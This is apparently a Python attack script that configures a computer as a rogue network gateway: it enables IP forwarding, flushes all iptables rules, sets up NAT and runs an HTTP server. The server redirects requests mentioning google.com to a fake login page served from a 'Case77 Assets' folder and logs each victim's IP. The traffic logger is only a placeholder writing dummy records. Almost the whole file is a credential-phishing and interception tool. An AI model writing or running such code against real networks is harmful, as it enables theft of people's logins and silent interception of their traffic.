import os
import subprocess
import json
import time
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer

def enable_ip_forwarding():
    """Enable IP forwarding on the system."""
    try:
        with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
            f.write('1')
        print("[+] IP forwarding enabled.")
    except PermissionError:
        print("[!] Permission denied: Run this script as root.")
        exit(1)
    except Exception as e:
        print(f"[!] Error enabling IP forwarding: {e}")
        exit(1)

def get_default_interface():
    """Detect the default network interface."""
    try:
        result = subprocess.run(['ip', 'route', 'show', 'default'], capture_output=True, text=True, check=True)
        interface = result.stdout.split()[-1]
        print(f"[*] Detected interface: {interface}")
        return interface
    except:
        print("[!] Could not detect interface. Falling back to 'eth0'. If this fails, specify manually.")
        return "eth0"

def configure_iptables(interface):
    """Set up NAT using iptables."""
    try:
        print(f"[*] Configuring iptables for interface: {interface}")
        subprocess.run(['sudo', 'iptables', '-F'], check=True)
        subprocess.run(['sudo', 'iptables', '-t', 'nat', '-F'], check=True)

        subprocess.run(['sudo', 'iptables', '-t', 'nat', '-A', 'POSTROUTING', '-o', interface, '-j', 'MASQUERADE'], check=True)
        subprocess.run(['sudo', 'iptables', '-A', 'FORWARD', '-i', interface, '-o', interface, '-j', 'ACCEPT'], check=True)

        print("[+] iptables rules configured.")
    except subprocess.CalledProcessError as e:
        print(f"[!] Error configuring iptables: {e}")
        exit(1)

def log_traffic():
    """Log network traffic to a JSON file with timestamps."""
    log_dir = "json logs"
    os.makedirs(log_dir, exist_ok=True)
    log_file = os.path.join(log_dir, "network_traffic_log.json")
    try:
        print(f"[*] Logging traffic to: {log_file}")
        with open(log_file, 'a') as f:
            counter = 0
            while True:
                # Placeholder: Replace with actual traffic capture logic
                traffic_data = {
                    "timestamp": time.strftime('%Y-%m-%d %H:%M:%S', time.gmtime()),
                    "source": "192.168.1.1",
                    "destination": "192.168.1.2",
                    "protocol": "TCP",
                    "data": "Example traffic data"
                }
                json.dump(traffic_data, f)
                f.write('\n')
                counter += 1
                if counter % 10 == 0:
                    print(f"[*] Traffic entries logged: {counter}")
                time.sleep(1)
    except KeyboardInterrupt:
        print("\n[+] Traffic logging stopped.")
    except Exception as e:
        print(f"[!] Error in traffic logging: {e}")

def start_http_server():
    """Start an HTTP server to handle requests and redirect to login page for specific domains."""
    log_dir = "json logs"
    os.makedirs(log_dir, exist_ok=True)
    log_file = os.path.join(log_dir, "http_requests_log.json")

    class CustomHTTPRequestHandler(BaseHTTPRequestHandler):
        def do_GET(self):
            client_ip = self.client_address[0]
            print(f"[*] Received GET request from {client_ip}")
           
            if "google.com" in self.path.lower():
        
                self.send_response(302)
                self.send_header("Location", "/login")
                self.end_headers()

                request_data = {
                    "timestamp": time.strftime('%Y-%m-%d %H:%M:%S', time.gmtime()),
                    "client_ip": client_ip,
                    "method": "GET",
                    "path": self.path,
                    "action": "redirected to login"
                }
                with open(log_file, 'a') as log_f:
                    json.dump(request_data, log_f)
                    log_f.write('\n')
                return

            html_folder = "Case77 Assets"
            html_file = os.path.join(html_folder, "login.html")

            if os.path.exists(html_file):
                with open(html_file, 'r') as f:
                    content = f.read()
                self.send_response(200)
                self.send_header("Content-type", "text/html")
                self.end_headers()
                self.wfile.write(content.encode("utf-8"))

                request_data = {
                    "timestamp": time.strftime('%Y-%m-%d %H:%M:%S', time.gmtime()),
                    "client_ip": client_ip,
                    "method": "GET",
                    "path": self.path
                }
                with open(log_file, 'a') as log_f:
                    json.dump(request_data, log_f)
                    log_f.write('\n')
            else:
                self.send_response(404)
                self.send_header("Content-type", "text/html")
                self.end_headers()
                self.wfile.write(b"<html><body><h1>404 Not Found</h1></body></html>")
        
        def log_message(self, format, *args):
            # Suppress default logging
            pass

    server_address = ("", 8080)  # Listen on all interfaces, port 8080
    httpd = HTTPServer(server_address, CustomHTTPRequestHandler)
    print("[+] HTTP server running on port 8080...")
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n[+] HTTP server stopped.")
    except Exception as e:
        print(f"[!] HTTP server error: {e}")

def main():
    print("\n[*] Setting up the computer as a network gateway...")
    print("[!] WARNING: This will modify your network configuration.")
    print("[!] Make sure you have administrative privileges.\n")
    
    enable_ip_forwarding()
    interface = get_default_interface()
    configure_iptables(interface)
    
    print("\n[*] Starting traffic logging in background thread...")
    traffic_thread = threading.Thread(target=log_traffic, daemon=True)
    traffic_thread.start()
    
    print("[*] Starting HTTP server...\n")
    start_http_server()

if __name__ == "__main__":
    main()
